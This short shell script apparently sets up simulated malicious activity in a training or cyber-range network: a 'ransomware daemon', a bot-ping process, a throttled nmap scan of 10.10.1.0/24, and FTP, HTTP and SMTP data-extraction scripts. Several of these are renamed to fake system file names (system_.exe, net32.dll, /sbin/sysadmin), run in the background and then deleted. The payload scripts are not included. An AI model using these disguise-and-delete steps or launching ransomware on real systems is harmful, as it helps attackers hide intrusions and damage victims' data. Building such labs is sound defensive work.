# start botping process
cp bot_ping.py /usr/bin/
mv /usr/bin/bot_ping.py /usr/bin/system_.exe
python2 system_.exe &

# start ransomware daemon
python2 system32.py &

# start nmap user
getty -a fred_1 tty15 &
su fred_1 -c 'nmap -r -F --max-rate 1 10.10.1.0/24' > /dev/null &

# start ftp user
getty -a allan_1 tty19 &
cp ftp_user.py /home/allan_1/allan_1.py
su allan_1 -c "python2 /home/allan_1/allan_1.py" &
rm /home/allan_1/allan_1.py

# http post
cp http_post_user.py /sbin/sysadmin
python2 /sbin/sysadmin &
rm /sbin/sysadmin

# smtp
cp smtp_extract.py /bin/net32.dll
python2 /bin/net32.dll &
rm /bin/net32.dll

# apache webhook from Rumnex

# ssh user from Rumnex
